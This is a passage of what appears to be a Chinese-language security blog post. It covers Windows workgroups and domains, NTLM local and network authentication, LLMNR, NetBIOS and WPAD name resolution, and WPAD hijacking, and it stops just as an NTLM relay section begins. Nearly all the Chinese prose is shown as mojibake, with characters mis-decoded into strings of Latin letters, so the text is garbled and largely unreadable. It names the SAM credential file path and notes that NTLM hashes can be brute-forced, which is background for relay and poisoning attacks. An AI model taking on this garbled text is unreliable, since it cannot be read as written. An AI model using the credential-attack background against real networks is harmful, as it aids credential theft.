åŸŸå’Œå·¥ä½œç»„</h2><p>å·¥ä½œç»„å’ŒåŸŸå®è§‚ä¸Šéƒ½æ˜¯ä¸€ç¾¤è®¡ç®—æœºçš„é›†åˆï¼ŒåŸŸä¸­è®¡ç®—æœºçš„æ•°é‡è§„æ¨¡é€šå¸¸å¤§äºå·¥ä½œç»„å†…çš„è®¡ç®—æœºã€‚</p><p>å·¥ä½œç»„å†…çš„æœºå™¨åä¹‰ä¸Šè™½ç„¶æ˜¯å±äºä¸€ä¸ªé›†åˆï¼Œä½†æ˜¯å†…éƒ¨å„è®¡ç®—æœºè¿˜æ˜¯å„è‡ªç®¡ç†å„è‡ªçš„ï¼Œæ²¡æœ‰ä¸€ä¸ªç›¸å¯¹æˆç†Ÿçš„ä¿¡ä»»æœºåˆ¶ï¼Œå·¥ä½œç»„å†…å„ä¸ªè®¡ç®—æœºçš„å…³ç³»ä¾æ—§æ˜¯<strong>ç‚¹å¯¹ç‚¹</strong>ã€‚å› æ­¤ï¼Œåœ¨å·¥ä½œç»„ç¯å¢ƒä¸‹è¿›è¡Œè®¿é—®è®¤è¯ï¼Œä»…æ¶‰åŠClientå’ŒServerã€‚æˆ‘ä»¬ä½¿ç”¨çš„ä¸ªäººè®¡ç®—æœºï¼Œé»˜è®¤ä¾¿å¤„äº<strong>WORKGROUP</strong>å·¥ä½œç»„ç¯å¢ƒä¸‹</p><p>åŸŸæ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼ŒåŒä¸€ä¸ªåŸŸä¸­çš„è®¡ç®—æœºé€šè¿‡å…±åŒçš„ç¬¬ä¸‰æ–¹ä¿¡ä»»æœºæ„å»ºç«‹ä¿¡ä»»å…³ç³»ï¼Œè¿™ä¸ªç¬¬ä¸‰æ–¹ä¿¡ä»»æœºæ„è§’è‰²ç”±DC(åŸŸæ§åˆ¶å™¨)æ‹…å½“ã€‚é€šä¿—æ¥è®²ï¼ŒåŸŸä¸­çš„æœºå™¨éƒ½ä¿¡ä»»åŸŸæ§åˆ¶å™¨ï¼Œé‚£ä¹ˆåªè¦åŸŸæ§åˆ¶å™¨ä¿¡ä»»æˆ‘ä»¬ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨åŸŸå†…è·å¾—å¯¹å…¶ä»–æœåŠ¡å™¨çš„è®¿é—®æƒé™ã€‚åœ¨è¿™ç§è®¤è¯ä½“ç³»ä¸­æ¶‰åŠä¸‰æ–¹ï¼š<strong>Clientã€Serverã€DC</strong></p><p>VMwareä¸­åŸŸç¯å¢ƒçš„æ­å»ºè¯¦è§ï¼š</p><blockquote><p><a href="https://blog.csdn.net/weixin_36711901/article/details/102995640">VMwareä¸­ç”¨è™šæ‹Ÿæœºæ¨¡æ‹Ÿæ­å»ºåŸŸï¼ˆæ­¥éª¤ã€è®²è§£è¯¦å®ï¼Œå¹¶ä»¥æµ…æ˜¾çš„æ–¹å¼è®²è§£äº†VMwareä¸­çš„ä¸‰ç§ç½‘ç»œæ¨¡å¼ã€IPé…ç½®ï¼‰ï¼ŒWindows Server 2008 R2ä¸ºåŸŸæ§æœåŠ¡å™¨ï¼ŒWin7ä¸ºåŸŸæˆå‘˜æœåŠ¡å™¨_èƒ–èƒ–çš„é£è±¡çš„åšå®¢-CSDNåšå®¢_è™šæ‹Ÿæœºæ€ä¹ˆåˆ›å»ºåŸŸ</a></p></blockquote><h2 id="0x02-ntlmè®¤è¯windows"><a class="markdownIt-Anchor" href="#0x02-ntlmè®¤è¯windows"></a> 0x02 NTLMè®¤è¯(Windows)</h2><h3 id="æœ¬åœ°è®¤è¯"><a class="markdownIt-Anchor" href="#æœ¬åœ°è®¤è¯"></a> æœ¬åœ°è®¤è¯</h3><p>Windowsä¸å­˜å‚¨ç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼Œå®ƒä¼šå°†ç”¨æˆ·çš„æ˜æ–‡å¯†ç ç»è¿‡åŠ å¯†åå­˜å‚¨åœ¨ SAM (<em>Security Account Manager Database</em>ï¼Œå®‰å…¨è´¦å·ç®¡ç†æ•°æ®åº“)æ–‡ä»¶ä¸­ã€‚</p><blockquote><p>SAMæ–‡ä»¶çš„è·¯å¾„æ˜¯ <code>%SystemRoot%\system32\config\sam</code></p></blockquote><p>åœ¨è¿›è¡Œæœ¬åœ°è®¤è¯çš„è¿‡ç¨‹ä¸­ï¼Œå½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿå°†ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç åŠ å¯†æˆ <em><code>NTLM Hash</code></em>ï¼Œä¸ SAMæ•°æ®åº“ä¸­çš„ <em><code>NTLM Hash</code></em> è¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œå®ç°è®¤è¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">winlogon.exe -&gt; æ¥æ”¶ç”¨æˆ·è¾“å…¥ -&gt; lsass.exe -&gt; è®¤è¯<br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œç”¨æˆ·æ³¨é”€ã€é‡å¯ã€é”å±åï¼Œæ“ä½œç³»ç»Ÿä¼šè®© <code>winlogon</code>æ˜¾ç¤ºç™»å½•ç•Œé¢ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥æ¡†ï¼Œæ¥æ”¶è¾“å…¥åï¼Œå°†å¯†ç äº¤ç»™ <code>lsass</code>è¿›ç¨‹ï¼Œ<em>è¿™ä¸ªè¿›ç¨‹ä¸­ä¼šå­˜ä¸€ä»½æ˜æ–‡å¯†ç </em>ï¼Œå°†æ˜æ–‡å¯†ç åŠ å¯†æˆ<code>NTLM Hash</code>ï¼Œå¯¹æ¯” SAMæ•°æ®åº“ä¸­çš„Hashè¿›è¡ŒéªŒè¯</p><h4 id="ntlm-hashçš„ç”Ÿæˆ"><a class="markdownIt-Anchor" href="#ntlm-hashçš„ç”Ÿæˆ"></a> NTLM Hashçš„ç”Ÿæˆ</h4><ul><li>æ˜æ–‡å¯†ç ï¼š<code>123456</code></li><li>é¦–å…ˆï¼Œå¯†ç ç»è¿‡åå…­è¿›åˆ¶ASCâ…¡è½¬ä¸º -&gt; <code>313233343536</code></li><li>å°†åå…­è¿›åˆ¶ç»“æœè½¬ä¸º Unicodeæ ¼å¼ -&gt;<code>310032003300340035003600</code></li><li>ä»¥ Hexï¼ˆ16è¿›åˆ¶ï¼‰æ•°æ®ä½œMD4åŠ å¯† -&gt;<code>32ED87BDB5FDC5E9CBA88547376818D4</code></li></ul><blockquote><p>ç”±äºNTLM Hashçš„ç®—æ³•å…¬å¼€ï¼Œæ•…è·å¾—çš„Hashå¯æš´åŠ›ç ´è§£(MD4å•å‘ä¸å¯é€†)</p></blockquote><h3 id="ç½‘ç»œè®¤è¯"><a class="markdownIt-Anchor" href="#ç½‘ç»œè®¤è¯"></a> ç½‘ç»œè®¤è¯</h3><p>NTLMå‡­æ®åŒ…æ‹¬<strong>åŸŸå</strong>ï¼Œ<strong>ç”¨æˆ·å</strong>å’Œ<strong>ç”¨æˆ·å¯†ç çš„å•å‘Hash</strong>ã€‚ç”¨æˆ·çš„å¯†ç ä¸ä¼šåœ¨ç½‘ç»œé“¾è·¯ä¸­ä¼ è¾“ï¼ŒåŠ å¯†ä¹‹åçš„Challengeå€¼å–ä»£åŸæœ¬å¯†ç çš„ä½œç”¨è¿›è¡Œå¯¹æ¯”éªŒè¯ï¼Œä¸ä¼ ç»Ÿä¼ è¾“å¯†ç çš„æ–¹å¼ç›¸æ¯”ï¼Œå…·æœ‰è¾ƒé«˜çš„å®‰å…¨æ€§</p><p>NTLMçš„è®¤è¯æ–¹å¼åˆ†ä¸ºäº¤äº’å¼å’Œäº¤äº’å¼</p><ul><li>é€šè¿‡ç½‘ç»œè¿›è¡Œçš„<strong>äº¤äº’å¼NTLMèº«ä»½éªŒè¯</strong>é€šå¸¸æ¶‰åŠä¸¤ä¸ªç³»ç»Ÿï¼š<strong>å®¢æˆ·ç«¯ç³»ç»Ÿ</strong>ï¼Œç”¨æˆ·ç”¨äºè¯·æ±‚èº«ä»½éªŒè¯ï¼›<strong>åŸŸæ§åˆ¶å™¨</strong>ï¼Œå…¶ä¸­ä¿ç•™ä¸ç”¨æˆ·å¯†ç æœ‰å…³çš„ä¿¡æ¯ï¼›äº¤äº’å¼æä¾›å¿…è¦å‡­æ®ï¼Œåº”ç”¨åœºæ™¯é€šå¸¸ä¸ºç”¨æˆ·è¦ç™»å½•æŸå°å®¢æˆ·ç«¯</li><li><strong>NTLMéäº¤äº’å¼èº«ä»½éªŒè¯</strong>é€šå¸¸æ¶‰åŠNTLMä¸‰ä¸ªç³»ç»Ÿï¼š<strong>å®¢æˆ·ç«¯</strong>ï¼Œ<strong>æœåŠ¡å™¨</strong>å’Œ<strong>ä»£è¡¨æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯è®¡ç®—çš„åŸŸæ§åˆ¶å™¨</strong>ï¼›æ— éœ€äº¤äº’å¼æä¾›å‡­æ®ï¼Œå®é™…åº”ç”¨æ›´å¤šä¸º<strong>å·²ç™»å½•æŸå®¢æˆ·ç«¯çš„ç”¨æˆ·å»è¯·æ±‚å¦ä¸€å°æœåŠ¡å™¨çš„èµ„æº</strong> ï¼Œå³ç”¨æˆ·åªéœ€è¦ç™»å½•ä¸€æ¬¡å³å¯è®¿é—®æ‰€æœ‰ç›¸äº’ä¿¡ä»»çš„åº”ç”¨ç³»ç»ŸåŠå…±äº«èµ„æº</li></ul><h4 id="å·¥ä½œç»„ç¯å¢ƒntlmè®¤è¯æµç¨‹æŠ—é‡æ”¾æŠ€æœ¯"><a class="markdownIt-Anchor" href="#å·¥ä½œç»„ç¯å¢ƒntlmè®¤è¯æµç¨‹æŠ—é‡æ”¾æŠ€æœ¯"></a> å·¥ä½œç»„ç¯å¢ƒNTLMè®¤è¯æµç¨‹ï¼ˆæŠ—é‡æ”¾æŠ€æœ¯ï¼‰</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>ç”¨æˆ·è®¿é—®å®¢æˆ·æœºå¹¶æä¾›åŸŸåï¼Œç”¨æˆ·åï¼Œå¯†ç ã€‚å®¢æˆ·ç«¯è®¡ç®—å¯†ç çš„<span class="hljs-built_in">Hash</span>ï¼Œå¹¶ä¸¢å¼ƒå®é™…å¯†ç ã€‚<br><span class="hljs-number">2.</span>å®¢æˆ·ç«¯å°†ç”¨æˆ·åå‘é€åˆ°æœåŠ¡å™¨ã€‚<br><span class="hljs-number">3.</span>æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ª<span class="hljs-number">16</span>å­—èŠ‚çš„éšæœºæ•°Challengeå¹¶å‘é€ç»™å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">4.</span>å®¢æˆ·ç«¯ä½¿ç”¨ç”¨æˆ·å¯†ç çš„<span class="hljs-built_in">Hash</span>å¯¹Challengeè¿›è¡ŒåŠ å¯†ï¼Œç„¶åå°†ç»“æœresponse(Net-NTLM <span class="hljs-built_in">hash</span>)è¿”å›ç»™æœåŠ¡å™¨ã€‚<br><span class="hljs-number">5.</span>æœåŠ¡å™¨ä½¿ç”¨ç”¨æˆ·åä»SAMæ•°æ®åº“ä¸­æ£€ç´¢ç”¨æˆ·å¯†ç <span class="hljs-built_in">Hash</span>ï¼Œä½¿ç”¨æ­¤å¯†ç <span class="hljs-built_in">Hash</span>å¯¹Challengeè¿›è¡ŒåŠ å¯†ã€‚<br><span class="hljs-number">6.</span>æœåŠ¡å™¨å°†å…¶åŠ å¯†çš„Challengeï¼ˆåœ¨æ­¥éª¤<span class="hljs-number">5</span>ä¸­ï¼‰ä¸å®¢æˆ·ç«¯è®¡ç®—çš„responseï¼ˆåœ¨æ­¥éª¤<span class="hljs-number">4</span>ä¸­ï¼‰è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœå®ƒä»¬ç›¸åŒåˆ™èº«ä»½éªŒè¯æˆåŠŸã€‚<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/MFWRKurpgJbavOH.png" alt="image-20210802213128690" /></p><h4 id="åŸŸç¯å¢ƒntlmè®¤è¯"><a class="markdownIt-Anchor" href="#åŸŸç¯å¢ƒntlmè®¤è¯"></a> åŸŸç¯å¢ƒNTLMè®¤è¯</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>ç”¨æˆ·è®¿é—®å®¢æˆ·æœºå¹¶æä¾›åŸŸåï¼Œç”¨æˆ·åï¼Œå¯†ç ã€‚å®¢æˆ·ç«¯è®¡ç®—å¯†ç çš„<span class="hljs-built_in">Hash</span>ï¼Œå¹¶ä¸¢å¼ƒå®é™…å¯†ç ã€‚<br><span class="hljs-number">2.</span>å®¢æˆ·ç«¯å°†ç”¨æˆ·åå‘é€åˆ°æœåŠ¡å™¨ã€‚<br><span class="hljs-number">3.</span>æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ª<span class="hljs-number">16</span>å­—èŠ‚çš„éšæœºæ•°Challengeå¹¶å‘é€ç»™å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">4.</span>å®¢æˆ·ç«¯ä½¿ç”¨ç”¨æˆ·å¯†ç çš„<span class="hljs-built_in">Hash</span>å¯¹Challengeè¿›è¡ŒåŠ å¯†ï¼Œç„¶åå°†ç»“æœresponse(Net-NTLM <span class="hljs-built_in">hash</span>)è¿”å›ç»™æœåŠ¡å™¨ã€‚<br><span class="hljs-number">5.</span>æœåŠ¡å™¨å°†ä¸‰ä¸ªä¿¡æ¯å‘é€åˆ°åŸŸæ§åˆ¶å™¨ï¼šç”¨æˆ·åï¼Œå‘é€ç»™å®¢æˆ·æœºçš„Challengeï¼Œè¿”å›ç»™æœåŠ¡å™¨çš„responseã€‚<br><span class="hljs-number">6.</span>åŸŸæ§åˆ¶å™¨ä½¿ç”¨ç”¨æˆ·åä»SAMæ•°æ®åº“ä¸­æ£€ç´¢ç”¨æˆ·å¯†ç <span class="hljs-built_in">Hash</span>ã€‚ä½¿ç”¨æ­¤å¯†ç <span class="hljs-built_in">Hash</span>å¯¹Challengeè¿›è¡ŒåŠ å¯†ã€‚<br><span class="hljs-number">7.</span>åŸŸæ§åˆ¶å™¨å°†å…¶åŠ å¯†çš„Challengeï¼ˆåœ¨æ­¥éª¤<span class="hljs-number">6</span>ä¸­ï¼‰ä¸å®¢æˆ·ç«¯è®¡ç®—çš„responseï¼ˆåœ¨æ­¥éª¤<span class="hljs-number">4</span>ä¸­ï¼‰è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœå®ƒä»¬ç›¸åŒåˆ™èº«ä»½éªŒè¯æˆåŠŸã€‚<br></code></pre></td></tr></table></figure><img src="https://i.loli.net/2021/08/03/ChDv1n8sLBeVJdz.png" alt="image-20210803080036544" style="zoom:67%;" /><blockquote><p><strong>åŸŸç¯å¢ƒServerä¼šå°†è®¤è¯ä¿¡æ¯ä½¿ç”¨netlogonåè®®å‘é€ç»™åŸŸæ§åˆ¶å™¨ï¼Œç”±åŸŸæ§åˆ¶å™¨å®Œæˆæ£€éªŒå¹¶è¿”å›è®¤è¯ç»“æœ</strong></p></blockquote><h2 id="0x03-åŸŸåè§£æåè®®"><a class="markdownIt-Anchor" href="#0x03-åŸŸåè§£æåè®®"></a> 0x03 åŸŸåè§£æåè®®</h2><h3 id="llmnr"><a class="markdownIt-Anchor" href="#llmnr"></a> LLMNR</h3><p>ä» <strong>Windows Vista</strong> èµ·ï¼ŒWindows æ“ä½œç³»ç»Ÿå¼€å§‹æ”¯æŒä¸€ç§æ–°çš„åç§°è§£æåè®® â€”â€” LLMNRï¼Œä¸»è¦ç”¨äºå±€åŸŸç½‘ä¸­çš„åç§°è§£æã€‚<strong>é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æ</strong>ï¼ˆLLMNRï¼‰æ˜¯ä¸€ä¸ªåŸºäºåè®®çš„åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰æ•°æ®åŒ…çš„æ ¼å¼ï¼Œä½¿å¾—åŒæ–¹çš„IPv4å’ŒIPv6çš„ä¸»æœºæ¥æ‰§è¡Œåç§°è§£ æä¸ºåŒä¸€æœ¬åœ°é“¾è·¯ä¸Šçš„ä¸»æœºã€‚å½“å±€åŸŸç½‘ä¸­çš„DNSæœåŠ¡å™¨ä¸å¯ç”¨æ—¶ï¼Œ DNSå®¢æˆ·ç«¯ä¼šä½¿ç”¨LLMNRæœ¬åœ°é“¾è·¯å¤šæ’­åç§°è§£ææ¥è§£ææœ¬åœ°ç½‘æ®µä¸Šçš„ ä¸»æœºçš„åç§°ï¼Œç›´åˆ°ç½‘ç»œè¿æ¥æ¢å¤æ­£å¸¸ä¸ºæ­¢ã€‚</p><h4 id="è§£æè¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è§£æè¿‡ç¨‹"></a> è§£æè¿‡ç¨‹</h4><p>ä¸€ä¸ªå®Œæ•´çš„æ­£å¸¸çš„ LLMNR åç§°è§£æè¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><strong>æ³¨ï¼šå‡å®šä¸»æœº B å·²åŠ å…¥äº†ç»„æ’­ç»„ä¸­ã€‚</strong></p><p><img src="https://i.loli.net/2021/08/03/RsauDponXBP2wKY.png" alt="image-20210803081906640" /></p><hr /><h3 id="netbios"><a class="markdownIt-Anchor" href="#netbios"></a> NetBIOS</h3><p><img align = "right" src = "https://i.loli.net/2021/08/03/WEdHQcCwLOzDlNT.png" style="zoom: 80%;" >NetBIOS(Network Basic Input Output System)ï¼šç½‘ç»œåŸºæœ¬è¾“å…¥è¾“å‡º ç³»ç»Ÿï¼Œå®ƒæä¾›äº†OSIæ¨¡å‹ä¸­çš„ä¼šè¯å±‚æœåŠ¡ï¼Œè®©åœ¨ä¸åŒè®¡ç®—æœºä¸Šè¿è¡Œçš„ ä¸åŒç¨‹åºï¼Œå¯ä»¥åœ¨å±€</p><p>åŸŸç½‘ä¸­ï¼Œäº’ç›¸è¿çº¿ï¼Œä»¥åŠåˆ†äº«æ•°æ®ã€‚ä¸¥æ ¼æ¥è¯´ï¼Œ NetBIOSæ˜¯ä¸€ç§åº”ç”¨ç¨‹åºæ¥å£(API)ï¼Œç³»ç»Ÿå¯ä»¥åˆ©ç”¨WINSæœåŠ¡ã€å¹¿æ’­åŠ Lmhostsæ–‡ä»¶ç­‰å¤šç§æ¨¡å¼å°†NetBIOSåè§£</p><p>æä¸ºç›¸åº”IPåœ°å€ï¼Œå‡ ä¹æ‰€æœ‰çš„ å±€åŸŸç½‘éƒ½æ˜¯åœ¨NetBIOSåè®®çš„åŸºç¡€ä¸Šå·¥ä½œçš„ã€‚NetBIOSä¹Ÿæ˜¯è®¡ç®—æœºçš„ æ ‡è¯†åç§°ï¼Œä¸»è¦ç”¨äºå±€åŸŸç½‘å†…è®¡ç®—æœºçš„äº’è®¿ã€‚NetBIOSåç§°æ˜¯</p><p>ä¸€ä¸ªé•¿åº¦ä¸º16ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚MSç½‘ç»œä¸­ç”¨åˆ°NetBIOSåç§°çš„åœ°æ–¹æœ‰ï¼šè®¡ç®—æœºåï¼ŒåŸŸåï¼Œå·¥ä½œç»„åã€‚</p><p>æŸ¥çœ‹å½“å‰æœºå™¨æ³¨å†Œçš„NetBIOSåç§°ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbtstat -n</span><br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/NK6JC9kLVOAqlxX.png" alt="image-20210803083305277"  /><p>æŸ¥çœ‹å½“å‰çš„NetBIOSåç§°ç¼“å­˜åŒºï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nbtstat -c</span> <br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ NetBIOSèŠ‚ç‚¹ç±»å‹ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/2p4Sux9QjmvE3qh.png" alt="image-20210803083606700" /><p>é‡‡ç”¨HèŠ‚ç‚¹çš„WINSå®¢æˆ·ç«¯ï¼Œå…¶NetBIOSåç§°è§£æçš„å®Œæ•´é¡ºåºä¸ºï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> æ£€æŸ¥è¦æŸ¥è¯¢çš„è®¡ç®—æœºåç§°æ˜¯ä¸æ˜¯è‡ªå·±çš„è®¡ç®—æœºåç§°ã€‚<br><span class="hljs-bullet">2.</span> æ£€æŸ¥NetBIOSåç§°ç¼“å­˜åŒºã€‚<br><span class="hljs-bullet">3.</span> å‘WINSæœåŠ¡å™¨æŸ¥è¯¢ã€‚<br><span class="hljs-bullet">4.</span> å‘å‡ºå¹¿æ’­æ¶ˆæ¯ã€‚<br><span class="hljs-bullet">5.</span> æ£€æŸ¥Lmhostsæ–‡ä»¶ã€‚<br><span class="hljs-bullet">6.</span> æ£€æŸ¥hostsæ–‡ä»¶æˆ–å‘DNSæœåŠ¡å™¨æŸ¥è¯¢ã€‚<br></code></pre></td></tr></table></figure><blockquote><p>Lmhostsæ–‡ä»¶å’Œhostsæ–‡ä»¶å­˜æ”¾äº <code>%Systemroot%\System32\drivers\etc</code>ç›®å½•ä¸‹ã€‚</p></blockquote><h3 id="windowsç³»ç»ŸåŸŸåè§£æé¡ºåº"><a class="markdownIt-Anchor" href="#windowsç³»ç»ŸåŸŸåè§£æé¡ºåº"></a> Windowsç³»ç»ŸåŸŸåè§£æé¡ºåº</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> æœ¬åœ°hostsæ–‡ä»¶ï¼ˆ%Systemroot%\System32\drivers\etc\hostsï¼‰<br><span class="hljs-bullet">2.</span> DNSç¼“å­˜/DNSæœåŠ¡å™¨<br><span class="hljs-bullet">3.</span> é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼ˆLLMNRï¼‰å’ŒNetBIOSåç§°æœåŠ¡ï¼ˆNBNSï¼‰<br></code></pre></td></tr></table></figure><p><strong>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåœ¨ç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°åç§°ï¼ŒDNSåç§°æœåŠ¡å™¨åˆè¯·æ±‚å¤±è´¥æ—¶ï¼ŒWindowsç³»ç»Ÿå°±ä¼šé€šè¿‡LLMNRå’ŒNetBIOSåç§°æœåŠ¡åœ¨æœ¬åœ°è¿›è¡Œåç§°è§£æã€‚è¿™æ—¶ï¼Œå®¢æˆ·ç«¯å°±ä¼šå°†æœªç»è®¤è¯çš„UDPå¹¿æ’­åˆ°ç½‘ç»œä¸­ï¼Œè¯¢é—®å®ƒæ˜¯å¦ä¸ºæœ¬åœ°ç³»ç»Ÿçš„åç§°ã€‚</strong></p><hr /><h2 id="0x04-wpad"><a class="markdownIt-Anchor" href="#0x04-wpad"></a> 0x04 WPAD</h2><p><strong>WPADï¼ˆWeb Proxy Auto-Discovery Protocolï¼‰</strong> æ˜¯ Web ä»£ç†è‡ªåŠ¨å‘ç°åè®®çš„ç®€ç§°ï¼Œè¯¥åè®®çš„åŠŸèƒ½æ˜¯å¯ä»¥ä½¿å±€åŸŸç½‘ä¸­ç”¨æˆ·çš„æµè§ˆå™¨å¯ä»¥è‡ªåŠ¨å‘ç°å†…ç½‘ä¸­çš„ä»£ç†æœåŠ¡å™¨ï¼Œå¹¶ä½¿ç”¨å·²å‘ç°çš„ä»£ç†æœåŠ¡å™¨è¿æ¥äº’è”ç½‘æˆ–è€…ä¼ä¸šå†…ç½‘ã€‚WPAD æ”¯æŒæ‰€æœ‰ä¸»æµçš„æµè§ˆå™¨ï¼Œä» IE 5.0 å¼€å§‹å°±å·²ç»æ”¯æŒäº†ä»£ç†æœåŠ¡å™¨è‡ªåŠ¨å‘ç°/åˆ‡æ¢çš„åŠŸèƒ½ï¼Œä¸è¿‡è‹¹æœå…¬å¸è€ƒè™‘åˆ° WPAD çš„å®‰å…¨é£é™©ï¼Œåœ¨åŒ…æ‹¬ OSX 10.10 åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸­çš„ Safari æµè§ˆå™¨å°†ä¸å†æ”¯æŒ PAC æ–‡ä»¶çš„è§£æã€‚</p><h3 id="å·¥ä½œåŸç†"><a class="markdownIt-Anchor" href="#å·¥ä½œåŸç†"></a> å·¥ä½œåŸç†</h3><p>å½“ç³»ç»Ÿå¼€å¯äº†ä»£ç†è‡ªåŠ¨å‘ç°åŠŸèƒ½åï¼Œç”¨æˆ·ä½¿ç”¨æµè§ˆå™¨ä¸Šç½‘æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šåœ¨å½“å‰å±€åŸŸç½‘ä¸­è‡ªåŠ¨æŸ¥æ‰¾ä»£ç†æœåŠ¡å™¨ï¼Œå¦‚æœ æ‰¾åˆ°äº†ä»£ç†æœåŠ¡å™¨ï¼Œåˆ™ä¼šä»ä»£ç†æœåŠ¡å™¨ä¸­ä¸‹è½½ä¸€ä¸ªåä¸º <strong>PACï¼ˆProxy Auto-Configï¼‰</strong> çš„é…ç½®æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶ä¸­å®šä¹‰äº†ç”¨ æˆ·åœ¨è®¿é—®ä¸€ä¸ª URL æ—¶æ‰€åº”è¯¥ä½¿ç”¨çš„ä»£ç†æœåŠ¡å™¨ã€‚æµè§ˆå™¨ä¼šä¸‹è½½å¹¶è§£æè¯¥æ–‡ä»¶ï¼Œå¹¶å°†ç›¸åº”çš„ä»£ç†æœåŠ¡å™¨è®¾ç½®åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ä¸­ã€‚</p><p>WPADå¯ä»¥åœ¨IEæµè§ˆå™¨çš„ <strong>Internet é€‰é¡¹ â€” è¿æ¥ â€” å±€åŸŸç½‘è®¾ç½® â€” è‡ªåŠ¨æ£€æµ‹è®¾ç½®</strong> ä¸­çœ‹åˆ°ï¼Œç³»ç»Ÿé»˜è®¤æ˜¯å‹¾é€‰æ­¤åŠŸèƒ½çš„ã€‚</p><h3 id="wpadåŠ«æŒ"><a class="markdownIt-Anchor" href="#wpadåŠ«æŒ"></a> WPADåŠ«æŒ</h3><p>WPAD é€šå¸¸ç”¨ DNS æ¥é…ç½®ï¼Œå®¢æˆ·ç«¯ä¸»æœºå‘ DNS æœåŠ¡å™¨å‘èµ·äº† WPADï¼‹X çš„æŸ¥è¯¢è¯·æ±‚ã€‚å¦‚æœå®¢æˆ·ç«¯ä¸»æœºæ˜¯å¤„äºåŸŸç¯å¢ƒä¸‹æ—¶ï¼Œå‘èµ·çš„ WPAD+X çš„æŸ¥è¯¢è¯·æ±‚ä¸º â€œWPAD.å½“å‰åŸŸçš„åŸŸåâ€ã€‚DNS æœåŠ¡å™¨å¯¹ WPAD ä¸»æœºçš„åç§°è¿›è¡Œè§£æè¿”å› WPAD ä¸»æœºçš„ IP åœ°å€ï¼Œå®¢æˆ·ç«¯ä¸»æœºé€šè¿‡ WPAD ä¸»æœºçš„ IP çš„ 80 ç«¯å£ä¸‹è½½å¹¶è§£æ PAC æ–‡ä»¶ã€‚</p><blockquote><p>è‹¥DNSæœåŠ¡å™¨æ²¡æœ‰è¯¥è®°å½•ï¼Œ<strong>åˆ™ä¼šé™ä¸ºLLMNR+NetBIOSåç§°æŸ¥è¯¢</strong></p></blockquote><img src="https://i.loli.net/2021/08/03/EFfw5xd7hsnWtoU.png" alt="image-20210803154531889" style="zoom:80%;" /><h2 id="0x05-ntlmä¸­ç»§"><a class="markdownIt-Anchor" href="#0x05-ntlmä¸­ç»§"></a> 0x05 NTLMä¸­ç»§</h2><p>NTLM èº«ä»½éªŒè¯è¢«å°è£…åœ¨å…¶ä»–åè®®ä¸­ï¼Œä½†æ˜¯æ— è®ºè¦†ç›–çš„åè®®æ˜¯ä»€ä¹ˆï¼Œæ¶ˆæ¯éƒ½æ˜¯ç›¸åŒçš„ã€‚è¿™å…è®¸åœ¨å…¶ä»–åè®®ä¸­ä½¿ç”¨ NTLM æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ HTTP è¿›è¡Œèº«ä»½éªŒè¯çš„å®¢æˆ·ç«¯ä¼šåœ¨â€œ Authorizationâ€æ ‡å¤´ä¸­å‘é€ NTLM èº«ä»½éªŒè¯æ¶ˆæ¯ã€‚æ”»å‡»è€…å¯ä»¥ä» HTTP 